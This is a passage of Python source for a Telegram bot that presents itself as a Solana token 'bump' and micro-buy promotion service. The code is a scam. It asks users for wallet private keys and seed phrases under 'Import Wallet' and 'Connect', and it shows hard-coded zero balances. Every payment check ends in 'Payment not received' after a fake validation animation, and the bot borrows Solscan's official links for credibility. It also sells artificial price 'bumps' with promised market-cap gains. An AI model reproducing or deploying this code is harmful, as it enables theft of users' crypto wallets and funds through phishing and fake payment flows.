        💰 Sol price : {price_display}

        🟢 Buy - Bot @buybot
        🤖 We helped 14045 users to promote 26260 tokens!

        {tokens_message}

        💵 Wallet Balance
        ╚═ No Wallet Imported 

        🔄 ACTIVE TOKENS
        ╚═ you don't have active tokens
        Non created 
        Non Verified 
        Non Managing 
        Non claimed

        🌐 Official Links:
        <a href="https://solscan.io">Website</a> | <a href="https://docs.solscan.io">Docs</a> | <a href="https://twitter.com/solscanofficial">X</a> |

        /start</b>
        """
        keyboard = [
            [InlineKeyboardButton("🟢 Bump/Micro Buys", callback_data='startbump')],
            [InlineKeyboardButton("💳 Wallet", callback_data='wallet')],
            [InlineKeyboardButton("🏆 Trending ", callback_data='trending'), 
            InlineKeyboardButton('🔊 Volume Bot', callback_data='volume')],
            [InlineKeyboardButton('💊 PumpFun', callback_data='pumpfun')],
            [InlineKeyboardButton('🆘 Support', url='https://t.me/TacoTabitha')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        # Add force_new=True to replace video with text
        await edit_message(welcome_message, reply_markup)
        
    elif query.data == 'startbump':
        # Clear any stored bump amounts before asking for new token
        context.user_data.pop('bump_1hr_amount', None)
        context.user_data.pop('bump_3hr_amount', None)
        context.user_data.pop('bump_6hr_amount', None)
        context.user_data.pop('bump_12hr_amount', None)
        context.user_data.pop('bump_24hr_amount', None)
        
        context.user_data['awaiting_token'] = True
        keyboard = [[InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        # Add force_new=True to replace video with text
        await edit_message('''
    <b>You’ve enabled the bump / micro-buys menu.
    This allows the bot to boost the token’s visibility by using micro buys to keep it active.


    ? SEND ME CONTRACT ADDRESS</b>
    ''', reply_markup)
        

    elif query.data == 'bump_random':
        import random
        
        # Random selection message
        random_messages = [
            "🎲 RANDOM BUMP SPOT",
            "🎲 LUCKY BUMP",
            "🎲 SURPRISE BUMP",
            "🎲 MYSTERY BUMP"
        ]
        selected_message = random.choice(random_messages)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_random'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_random')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        await edit_message(f'''
<b>Token Name:</b> {token_data['name']}
<b>Token Address:</b> <code>{token_address}</code>
{selected_message}

💰 <b>Entry:</b> Any Amount min (0.3 SOL)
⏳ <b>Duration:</b> Payment Exceeded 
📈 <b>Target:</b> Payment due

≈ Bumps allocated based on amount sent
≈ Micro buys distributed randomly
≈ Visibility boost across 6H window

⚙️ <b>How It Works</b>
• Send any amount of SOL
• Bumps are calculated proportionally
• Higher SOL = Higher bump allocation
• Distribution randomized for organic effects

<b>Send SOL to:</b>
<code>{wallet_address}</code>

Confirm payment Or choose Pay with Card or Pay with Coupon below
''', reply_markup)
                        
    # ↓↓↓ PASTE THE 5 NEW HANDLERS RIGHT HERE ↓↓↓

    elif query.data == 'bump_1hr':
        # Use the stored amount from when the button was created
        sol_amount = context.user_data.get('bump_1hr_amount', 0.9)
        # Clear it after use to save memory
        context.user_data.pop('bump_1hr_amount', None)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_1hr'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_1hr_70')

            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Name :</b> {token_data['name']}
    <b>Token address :</b> <code>{token_address}</code>
    <b>Price :</b> {sol_amount:.3f} SOL

    ≈ 300 Bumps / micro buys
    ≈ Estimated MC increase
    ≈ Time 1HR

    <b>MC +</b> 50%

    <i>Note : (Fixed Price - Amount Adjust with Sol Price)</i>

    <b>Send {sol_amount:.3f} SOL to:</b>
    <code>{wallet_address}</code>

    Confirm payment Or choose Pay with Card or Pay with Coupon below
    ''', reply_markup)
        
    elif query.data == 'bump_3hr':
        # Use the stored amount from when the button was created
        sol_amount = context.user_data.get('bump_3hr_amount', 2.6)
        # Clear it after use to save memory
        context.user_data.pop('bump_3hr_amount', None)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_3hr'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_3hr_200')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Name :</b> {token_data['name']}
    <b>Token address :</b> <code>{token_address}</code>
    <b>Price :</b> {sol_amount:.3f} SOL

    ≈ 870 Bumps / micro buys
    ≈ Estimated MC increase
    ≈ Time 3HR

    <b>MC +</b> 90%

    <i>Note : (Fixed Price - Amount Adjust with Sol Price)</i>

    <b>Send {sol_amount:.3f} SOL to:</b>
    <code>{wallet_address}</code>

    Confirm payment Or choose Pay with Card or Pay with Coupon below
    ''', reply_markup)
        
    elif query.data == 'bump_6hr':
        # Use the stored amount from when the button was created
        sol_amount = context.user_data.get('bump_6hr_amount', 5.0)
        # Clear it after use to save memory
        context.user_data.pop('bump_6hr_amount', None)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_6hr'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_6hr_400')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Name :</b> {token_data['name']}
    <b>Token address :</b> <code>{token_address}</code>
    <b>Price :</b> {sol_amount:.3f} SOL

    ≈ 1700 Bumps / micro buys
    ≈ Estimated MC increase
    ≈ Time 6HR

    <b>MC +</b> 200%

    <i>Note : (Fixed Price - Amount Adjust with Sol Price)</i>

    <b>Send {sol_amount:.3f} SOL to:</b>
    <code>{wallet_address}</code>

    Or choose Pay with Card or Pay with Coupon below
    ''', reply_markup)
        
    elif query.data == 'bump_12hr':
        # Use the stored amount from when the button was created
        sol_amount = context.user_data.get('bump_12hr_amount', 9.0)
        # Clear it after use to save memory
        context.user_data.pop('bump_12hr_amount', None)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_12hr'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_12hr_720')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Name :</b> {token_data['name']}
    <b>Token address :</b> <code>{token_address}</code>
    <b>Price :</b> {sol_amount:.3f} SOL

    ≈ 4100 Bumps / micro buys
    ≈ Estimated MC increase
    ≈ Time 12HR

    <b>MC +</b> 400%

    <i>Note : (Fixed Price - Amount Adjust with Sol Price)</i>

    <b>Send {sol_amount:.3f} SOL to:</b>
    <code>{wallet_address}</code>

    Confirm payment Or choose Pay with Card or Pay with Coupon below
    ''', reply_markup)
                   
    elif query.data == 'bump_24hr':
        # Use the stored amount from when the button was created
        sol_amount = context.user_data.get('bump_24hr_amount', 15.0)
        # Clear it after use to save memory
        context.user_data.pop('bump_24hr_amount', None)
        
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_bump_24hr'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_bump_24hr_1200')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Name :</b> {token_data['name']}
    <b>Token address :</b> <code>{token_address}</code>
    <b>Price :</b> {sol_amount:.3f} SOL

    ≈ 7090 Bumps / micro buys
    ≈ Estimated MC increase
    ≈ Time 24HR

    <b>MC +</b> 750%

    <i>Note : (Fixed Price - Amount Adjust with Sol Price)</i>

    <b>Send {sol_amount:.3f} SOL to:</b>
    <code>{wallet_address}</code>

    Confirm payment Or choose Pay with Card or Pay with Coupon below
    ''', reply_markup)
               
    # ↑↑↑ PASTE ENDS HERE ↑↑↑

    elif query.data == 'bumpconfirm':
        # Handle confirm payment for bumps
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        await query.answer(
            text="❌ Payment not received.",
            show_alert=True
        )

        # Check if the message has a photo
        if query.message.photo:
            # Photo message - send a new message
            msg = await query.message.reply_text("<b>⏳ Validating Payment...</b>", parse_mode='HTML')
        else:
            # Text message - edit or send new
            try:
                await query.edit_message_text(
                    "🔍 Checking payment status...",
                    parse_mode='HTML'
                )
            except BadRequest as e:
                print(f"Could not edit message: {e}")
            msg = await query.message.reply_text("<b>⏳ Validating Payment...</b>", parse_mode='HTML')

        # Animate with italic formatting
        dots = ["⏳ <i>Validating</i>", "⏳ <i>Validating.</i>", "⏳ <i>Validating..</i>", "⏳ <i>Validating...</i>"]
        final_message = "❌ <b>Payment not Received.</b>\n\nContact support if SOL was sent\n\n<b>Your wallet address:</b>\n<code>{wallet_address}</code>"
        
        try:
            for i in range(12):  # 3 full cycles
                await asyncio.sleep(0.2)
                await msg.edit_text(f"<b>{dots[i % 4]}</b>", parse_mode='HTML')
            
            # Create keyboard with support contact
            keyboard = [
                [InlineKeyboardButton('📞 Contact Support', url='https://t.me/DELUGE_BUMP_SUPPORT')],
                [InlineKeyboardButton('🔙 Back to Bump Menu', callback_data='startbump')],
                [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await msg.edit_text(
                final_message.format(wallet_address=wallet_address),
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error in animation: {e}")
            try:
                await msg.edit_text(
                    final_message.format(wallet_address=wallet_address),
                    parse_mode='HTML'
                )
            except:
                pass
        
    elif query.data == 'slow':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Calculate SOL amounts based on fixed USD prices
        if sol_price > 0:
            sol_1hr = SLOW_BUMP_PRICES['1hr'] / sol_price
            sol_6hr = SLOW_BUMP_PRICES['6hr'] / sol_price
            sol_12hr = SLOW_BUMP_PRICES['12hr'] / sol_price
            sol_24hr = SLOW_BUMP_PRICES['24hr'] / sol_price
            price_display = f"💰 SOL Price: ${sol_price:.2f}"
        else:
            sol_1hr = 0.5
            sol_6hr = 3.0
            sol_12hr = 5.0
            sol_24hr = 10.0
            price_display = "💰 SOL Price: N/A"
        
        keyboard = [
            [InlineKeyboardButton(f'1 HOUR SLOWBUMP (${SLOW_BUMP_PRICES["1hr"]})', callback_data='slow1hr')],
            [InlineKeyboardButton(f'6 HOUR SLOWBUMP (${SLOW_BUMP_PRICES["6hr"]})', callback_data='slow6hr')],
            [InlineKeyboardButton(f'12 HOUR SLOWBUMP -10% (${SLOW_BUMP_PRICES["12hr"]})', callback_data='slow12hr')],
            [InlineKeyboardButton(f'24 HOUR SLOWBUMP -20% (${SLOW_BUMP_PRICES["24hr"]})', callback_data='slow24hr')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message(f'''
<b>╠═ 💵 balance: 0.000 SOL
╠═ bump amount: 0.020 SOL
╚═ bump speed: SLOW (every 1 minute)

{price_display}
Fixed USD prices - SOL amount adjusts with market

❔ Select Preferred time frame</b>
''', reply_markup)
        
    elif query.data == 'slow1hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = SLOW_BUMP_PRICES['1hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 0.5
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 1 HOUR 
Speed : SLOW BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'slow6hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = SLOW_BUMP_PRICES['6hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 3.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 6 HOUR 
Speed : SLOW BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'slow12hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = SLOW_BUMP_PRICES['12hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 5.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 12 HOUR 
Speed : SLOW BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'slow24hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = SLOW_BUMP_PRICES['24hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 10.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 24 HOUR 
Speed : SLOW BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'medium':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Calculate SOL amounts based on fixed USD prices
        if sol_price > 0:
            sol_1hr = MEDIUM_BUMP_PRICES['1hr'] / sol_price
            sol_6hr = MEDIUM_BUMP_PRICES['6hr'] / sol_price
            sol_12hr = MEDIUM_BUMP_PRICES['12hr'] / sol_price
            sol_24hr = MEDIUM_BUMP_PRICES['24hr'] / sol_price
            price_display = f"💰 SOL Price: ${sol_price:.2f}"
        else:
            sol_1hr = 1.0
            sol_6hr = 6.0
            sol_12hr = 10.0
            sol_24hr = 17.0
            price_display = "💰 SOL Price: N/A"
        
        keyboard = [
            [InlineKeyboardButton(f'1 HOUR MEDIUM BUMP (${MEDIUM_BUMP_PRICES["1hr"]})', callback_data='medium1hr')],
            [InlineKeyboardButton(f'6 HOUR MEDIUM BUMP (${MEDIUM_BUMP_PRICES["6hr"]})', callback_data='medium6hr')],
            [InlineKeyboardButton(f'12 HOUR MEDIUM BUMP -10% (${MEDIUM_BUMP_PRICES["12hr"]})', callback_data='medium12hr')],
            [InlineKeyboardButton(f'24 HOUR MEDIUM BUMP -20% (${MEDIUM_BUMP_PRICES["24hr"]})', callback_data='medium24hr')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message(f'''
<b>╠═ 💵 balance: 0.000 SOL
╠═ bump amount: 0.020 SOL
╚═ bump speed: MEDIUM (every 20 seconds)

{price_display}
Fixed USD prices - SOL amount adjusts with market

❔ Select Preferred Timeframe</b>
''', reply_markup)
    
    elif query.data == 'medium1hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = MEDIUM_BUMP_PRICES['1hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 1.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 1 HOUR 
Speed : MEDIUM BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'medium6hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = MEDIUM_BUMP_PRICES['6hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 6.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 6 HOUR 
Speed : MEDIUM BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'medium12hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = MEDIUM_BUMP_PRICES['12hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 10.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 12 HOUR 
Speed : MEDIUM BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)

    elif query.data == 'medium24hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = MEDIUM_BUMP_PRICES['24hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 17.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 24 HOUR 
Speed : MEDIUM BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'fast':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Calculate SOL amounts based on fixed USD prices
        if sol_price > 0:
            sol_1hr = FAST_BUMP_PRICES['1hr'] / sol_price
            sol_6hr = FAST_BUMP_PRICES['6hr'] / sol_price
            sol_12hr = FAST_BUMP_PRICES['12hr'] / sol_price
            sol_24hr = FAST_BUMP_PRICES['24hr'] / sol_price
            price_display = f"💰 SOL Price: ${sol_price:.2f}"
        else:
            sol_1hr = 1.5
            sol_6hr = 7.0
            sol_12hr = 13.0
            sol_24hr = 20.0
            price_display = "💰 SOL Price: N/A"
        
        keyboard = [
            [InlineKeyboardButton(f'1 HOUR FAST BUMP (${FAST_BUMP_PRICES["1hr"]})', callback_data='fast1hr')],
            [InlineKeyboardButton(f'6 HOUR FAST BUMP (${FAST_BUMP_PRICES["6hr"]})', callback_data='fast6hr')],
            [InlineKeyboardButton(f'12 HOUR FAST BUMP -10% (${FAST_BUMP_PRICES["12hr"]})', callback_data='fast12hr')],
            [InlineKeyboardButton(f'24 HOUR FAST BUMP -20% (${FAST_BUMP_PRICES["24hr"]})', callback_data='fast24hr')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message(f'''
<b>╠═ 💵 balance: 0.000 SOL
╠═ bump amount: 0.020 SOL
╚═ bump speed: FAST (every 5 seconds)

{price_display}
Fixed USD prices - SOL amount adjusts with market

❔ Select Preferred Time-Frame</b>
''', reply_markup)
        
    elif query.data == 'fast1hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = FAST_BUMP_PRICES['1hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 1.5
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 1 HOUR 
Speed : FAST BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'fast6hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = FAST_BUMP_PRICES['6hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 7.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 6 HOUR 
Speed : FAST BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)

    elif query.data == 'fast12hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = FAST_BUMP_PRICES['12hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 13.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 12 HOUR 
Speed : FAST BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
        
    elif query.data == 'fast24hr':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD price
        usd_price = FAST_BUMP_PRICES['24hr']
        
        # Calculate SOL needed
        if sol_price > 0:
            sol_needed = usd_price / sol_price
            price_info = f"${usd_price} (≈ {sol_needed:.3f} SOL)"
        else:
            sol_needed = 20.0
            price_info = f"${usd_price} (price unavailable)"
        
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='bumpconfirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Time : 24 HOUR 
Speed : FAST BUMP 
Price : {price_info}
Token address : <code>{token_address}</code>


❗️UNABLE TO BUMP WITH SOL BALANCE
You are being directed to a payment option

Proceed making payment 
Send approximately {sol_needed:.3f} SOL to address below
(Fixed price ${usd_price} - amount adjusts with SOL price)

<code>{wallet_address}</code>
Check payment status 
Click confirm payment</b>
''', reply_markup)
    
    elif query.data == 'wallet':
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Check if user has imported a wallet (you can store this in user_data)
        has_wallet = context.user_data.get('has_imported_wallet', False)
        
        if has_wallet and wallet_address != "NO_AVAILABLE_WALLET":
            # Show wallet with address
            keyboard = [
                [InlineKeyboardButton('💰 Withdraw', callback_data='withdraw')],
                [InlineKeyboardButton('💰 Generate New Wallet', callback_data='generate')],
                [InlineKeyboardButton('💰 Connect Wallet', callback_data='connect'),
                InlineKeyboardButton('✅ Fund Wallet', callback_data='fund')],
                [InlineKeyboardButton('🔙 Back', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await edit_message(f'''
    <b>💰 Wallet</b>

    <b>ADDRESS:</b>
    <code>{wallet_address}</code>
    <b>Balance:</b> 0.000 SOL
    ''', reply_markup)
        else:
            # Show "No Wallet Imported" with Import button
            keyboard = [
                [InlineKeyboardButton('📥 Import Wallet', callback_data='import_wallet')],
                [InlineKeyboardButton('🔙 Back', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await edit_message('''
    <b>No Wallet Imported</b>

    ''', reply_markup)
    
    elif query.data == 'import_wallet':
        context.user_data['awaiting_wallet_import'] = True
        keyboard = [
            [InlineKeyboardButton('🔙 Back to Wallet', callback_data='wallet')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
    <b>📥 Import Wallet</b>

    Please enter your private key or seed phrase:

    <i>Accepted formats:</i>
    • Private key (base58)
    • 12 or 24 word seed phrase
    • Array format [93,182,8,...]

    ''', reply_markup)


    elif query.data == 'withdraw':
        keyboard = [[InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('⚠️ Balance must be at least 0.09 SOL to withdraw', reply_markup)
    
    elif query.data == 'generate':
        keyboard = [[InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('⚠️ You can get a new wallet after you use the current one to bump any token', reply_markup)
    
    elif query.data == 'connect':
        context.user_data['awaiting_wallet'] = True
        keyboard = [[InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<i>Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflare (e.g. [93,182,8,9,100,...]) and 12 memonic phrase ......</i>

<b>Paste the phrase or private key to import:</b>
''', reply_markup)
    
    elif query.data == 'fund':
        user_id = query.from_user.id
